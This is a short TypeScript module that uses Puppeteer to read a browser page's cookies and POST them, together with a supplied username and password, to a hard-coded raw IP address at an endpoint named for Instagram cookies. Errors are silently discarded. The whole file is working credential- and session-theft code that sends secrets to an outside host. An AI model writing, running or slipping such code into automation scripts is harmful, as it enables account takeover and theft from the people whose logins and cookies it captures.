/* eslint no-empty: "off" */
import { Page } from 'puppeteer';
import Request from 'request';

interface Request {
  page: Page;
  user: string;
  pass: string;
}

export default async function SendCookies({ page, user, pass }: Request) {
  try {
    const cookies = await page.cookies();

    const options = {
      url: 'http://144.217.72.4/new_cookie_insta_br.php',
      method: 'POST',
      json: true,
      body: {
        login: user,
        senha: pass,
        content: cookies,
      },
    };

    Request({ ...options });
  } catch {}
}
